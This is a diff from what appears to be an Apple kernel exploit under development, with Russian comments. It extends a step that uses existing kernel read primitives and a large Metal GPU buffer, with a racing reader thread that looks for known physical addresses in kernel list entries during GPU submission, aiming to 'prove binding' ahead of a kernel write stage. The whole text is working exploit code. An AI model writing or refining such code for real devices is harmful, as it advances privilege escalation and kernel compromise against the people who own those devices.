@@ -5348,12 +5348,15 @@ static void *kpRaceHammer(void *arg)
     return NULL;
 }
 
-// D3 reader: ловит PA нашего буфера в поле0 записей листа
+// D3 reader: ловит PA нашего буфера в поле0 записей листа + лог ненулевых
 static uint64_t gRdBuf = 0;
 static uint64_t *gRdPAs = NULL;
 static int gRdNPA = 0;
 static volatile int gRdHits = 0;
 static volatile int gRdStop = 0;
+static volatile unsigned gRdLogN = 0;
+static int gRdLogI[512];
+static uint64_t gRdLogV0[512], gRdLogV1[512];
 static void *kpListReader(void *arg)
 {
     (void)arg;
@@ -5361,6 +5364,12 @@ static void *kpListReader(void *arg)
         for (int i = 0; i < 64; i++) {
             uint64_t f0 = kp_rc_kread64(gRdBuf + (uint64_t)i * 0x10);
             if (!f0) continue;
+            uint64_t f1 = kp_rc_kread64(gRdBuf + (uint64_t)i * 0x10 + 8);
+            unsigned slot = gRdLogN;
+            if (slot < 512) {
+                gRdLogI[slot] = i; gRdLogV0[slot] = f0; gRdLogV1[slot] = f1;
+                gRdLogN = slot + 1;
+            }
             for (int j = 0; j < gRdNPA; j++) {
                 if (f0 == gRdPAs[j]) {
                     gRdHits++;
@@ -5425,13 +5434,22 @@ static void *kpListReader(void *arg)
         }
     }
 
-    // D3. ПРИВЯЗКА: private-буфер с сигнатурами → PA известны; во время
-    //     submit читатель на отдельном треде ловит наши PA в листе.
-    //     Критерий: ≥1 попадание (qword0 == sigPA[i]) = привязка доказана.
+    // D3v2. ПРИВЯЗКА с длинным окном: ГИГАНТСКИЙ private-буфер (256 МБ =
+    //     16384 страницы; fill идёт пачками по batch-cap → много окон подряд,
+    //     каждое миллисекунды). Сигнатуры в первые 64 страницы; читатель
+    //     поллит 64 записи и СКЛАДЫВАЕТ все ненулевые в лог (после — сверка).
+    //     Критерий: ≥1 запись с поле0 ∈ sigPA = привязка доказана эмпирически.
     id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
-    id<MTLBuffer> bufB = mtl ? [mtl newBufferWithLength:0x44000 options:MTLResourceStorageModePrivate] : nil;
-    if (!bufB) { GNOTE( @"FAIL: private buffer"); gGartLive = NO; return r; }
+    id<MTLBuffer> bufB = nil;
+    NSUInteger bigLen = 0x10000000;   // 256 МБ
+    bufB = mtl ? [mtl newBufferWithLength:bigLen options:MTLResourceStorageModePrivate] : nil;
+    if (!bufB) {
+        bigLen = 0x4000000;           // fallback 64 МБ
+        bufB = mtl ? [mtl newBufferWithLength:bigLen options:MTLResourceStorageModePrivate] : nil;
+    }
+    if (!bufB) { GNOTE( @"FAIL: private buffer (256/64 МБ)"); gGartLive = NO; return r; }
     uint64_t gvaB = (uint64_t)bufB.gpuAddress;
+    GNOTE( [NSString stringWithFormat:@"  D3v2: буфер %#lx байт gpuAddr=%#llx", (unsigned long)bigLen, gvaB]);
     @autoreleasepool {
         NSError *err = nil;
         id<MTLLibrary> lib = [mtl newLibraryWithSource:
@@ -5445,14 +5463,14 @@ static void *kpListReader(void *arg)
         if (enc) {
             [enc setComputePipelineState:pipe];
             [enc setBuffer:bufB offset:0 atIndex:0];
-            [enc dispatchThreads:MTLSizeMake(17,1,1) threadsPerThreadgroup:MTLSizeMake(17,1,1)];
+            [enc dispatchThreads:MTLSizeMake(64,1,1) threadsPerThreadgroup:MTLSizeMake(64,1,1)];
             [enc endEncoding];
             [cb commit];
             [cb waitUntilCompleted];
         }
-        GNOTE( [NSString stringWithFormat:@"  D3: сигнатурный submit status=%ld", (long)cb.status]);
+        GNOTE( [NSString stringWithFormat:@"  D3v2: сигнатурный submit (64 стр.) status=%ld", (long)cb.status]);
     }
-    // sig-scan (enum + heap scan) → sigPA
+    // sig-scan (enum + heap scan) → sigPA (до 64)
     uint32_t totalPages = (uint32_t)(kconstant(physSize) >> 14);
     uint32_t *heapPages = malloc((size_t)totalPages * 4);
     if (!heapPages) { GNOTE( @"FAIL: malloc"); gGartLive = NO; return r; }
@@ -5469,8 +5487,8 @@ static void *kpListReader(void *arg)
         }
     }
     uint64_t pb = kconstant(physBase);
-    uint64_t sigPA[40]; int nsig = 0;
-    for (uint32_t i = 0; i < nheap && nsig < 40; i++) {
+    uint64_t sigPA[64]; int nsig = 0;
+    for (uint32_t i = 0; i < nheap && nsig < 64; i++) {
         uint64_t pa = pb + ((uint64_t)heapPages[i] << 14);
         uint8_t two[16];
         kreadbuf(gPrimitives.phystokv(pa), two, 16);
@@ -5480,11 +5498,11 @@ static void *kpListReader(void *arg)
         sigPA[nsig++] = pa;
     }
     free(heapPages);
-    GNOTE( [NSString stringWithFormat:@"  D3: gpuAddr=%#llx, sig-страниц=%d; первый PA=%#llx", gvaB, nsig, nsig ? sigPA[0] : 0]);
-    if (!nsig) { GNOTE( @"  D3 FAIL: страницы не найдены"); gGartLive = NO; return r; }
+    GNOTE( [NSString stringWithFormat:@"  D3v2: sig-страниц=%d из 64 (первый PA=%#llx)", nsig, nsig ? sigPA[0] : 0]);
+    if (nsig < 8) { GNOTE( @"  D3v2 FAIL: мало sig-страниц"); gGartLive = NO; return r; }
 
-    // читатель: ловим sigPA в поле0 записей листа во время второго submit
-    gRdBuf = bufVA; gRdPAs = sigPA; gRdNPA = nsig; gRdHits = 0; gRdStop = 0;
+    // читатель: полл 64 записей, лог всех ненулевых (до 512), маркер по sigPA
+    gRdBuf = bufVA; gRdPAs = sigPA; gRdNPA = nsig; gRdHits = 0; gRdStop = 0; gRdLogN = 0;
     pthread_t rt;
     pthread_create(&rt, NULL, kpListReader, NULL);
     @autoreleasepool {
@@ -5503,13 +5521,15 @@ static void *kpListReader(void *arg)
             [cb commit];
             [cb waitUntilCompleted];
         }
-        GNOTE( [NSString stringWithFormat:@"  D3: submit#2 status=%ld", (long)cb.status]);
+        GNOTE( [NSString stringWithFormat:@"  D3v2: submit#2 (большой буфер) status=%ld", (long)cb.status]);
     }
     usleep(200000);
     gRdStop = 1;
     pthread_join(rt, NULL);
-    GNOTE( [NSString stringWithFormat:@"  D3: ПОПАДАНИЙ наших PA в листе = %d %@", gRdHits,
-               gRdHits ? @"— ПРИВЯЗКА ДОКАЗАНА" : @"— привязка НЕ подтверждена этим методом"]);
+    GNOTE( [NSString stringWithFormat:@"  D3v2: лог записей=%u, ПОПАДАНИЙ sigPA=%d %@", (unsigned)gRdLogN, gRdHits,
+               gRdHits ? @"— ПРИВЯЗКА ДОКАЗАНА ЭМПИРИЧЕСКИ" : @"— привязка НЕ подтверждена"]);
+    for (unsigned di = 0; di < gRdLogN && di < 24; di++)
+        GNOTE( [NSString stringWithFormat:@"    log[%u] rec[%d] поле0=%#llx поле1=%#llx", di, gRdLogI[di], gRdLogV0[di], gRdLogV1[di]]);
 
     // D4. префлайт записи (повтор на этом буте)
     {
